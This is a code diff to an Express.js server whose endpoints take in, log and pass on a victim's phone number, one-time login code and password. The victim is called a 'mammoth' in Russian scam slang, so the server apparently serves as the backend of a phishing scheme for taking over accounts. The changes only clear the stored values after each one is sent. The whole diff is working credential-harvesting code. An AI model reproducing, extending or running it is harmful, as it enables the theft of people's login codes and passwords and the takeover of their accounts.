@@ -36,6 +36,8 @@ app.post('/phone', (req, res) => {
         pn = phone_number;
         console.log(`Номер телефона мамонта: ${phone_number}`);
         res.json({ message: `Номер телефона мамонта: ${phone_number}` });
+        // Установка переменной обратно в undefined после отправки
+        pn = undefined;
         return;
     } else {
         console.log('Номер телефона мамонта неопределен.');
@@ -43,7 +45,6 @@ app.post('/phone', (req, res) => {
         return;
     }
 });
-
 app.get('/getPhone', (req, res) => {
     if(pn){
         res.send(`Номер телефона мамонта: ${pn}`);
@@ -60,11 +61,13 @@ app.post('/authCode', (req, res) => {
         code = value;
         console.log(`Код мамонта: ${value}`);
         res.json({ message: `Код мамонта: ${value}` });
-        return 0;
+        // Установка переменной обратно в undefined после отправки
+        code = undefined;
+        return;
     } else {
         console.log('Код мамонта неопределен.');
         res.status(400).json({ error: 'Код мамонта неопределен.' });
-        return 0;
+        return;
     }
 });
 
@@ -84,6 +87,8 @@ app.post('/password', (req, res) => {
         pass = password;
         console.log(`Пароль мамонта: ${password}`);
         res.json({ message: `Пароль мамонта: ${password}` });
+        // Установка переменной обратно в undefined после отправки
+        pass = undefined;
         return;
     } else {
         console.log('Пароль мамонта неопределен.');
